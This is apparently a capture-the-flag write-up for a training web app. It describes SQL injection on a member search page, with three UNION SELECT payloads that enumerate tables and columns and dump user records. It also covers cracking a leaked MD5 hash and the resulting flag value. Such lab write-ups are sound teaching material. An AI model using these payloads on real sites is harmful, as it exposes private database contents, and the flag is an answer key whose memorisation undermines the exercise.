# 03_sql_injection_members

Able to inject sql statements on member search

## Method

Go to the Member Search Page
Homepage > Members

Type `-1 UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = database ()` to get the table name.

Type `1 UNION SELECT NULL, column_name from information_schema.columns where table_schema = database ()` to get the colums.

Type `-100 UNION SELECT NULL, concat(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users` to get all of the fields.

On of the members have this information: `5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28`

Using https://www.md5online.org/md5-decrypt.html to decrypt `5ff9d0165b4f92b14994e5c685cdce28` gives you `FortyTwo`.

Then using https://emn178.github.io/online-tools/sha256.html with lower case `FortyTwo` gives you the flag `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`



## Explanation

With SQL injections you can browse through all of the information stored on the database and access information not intended to be shared.
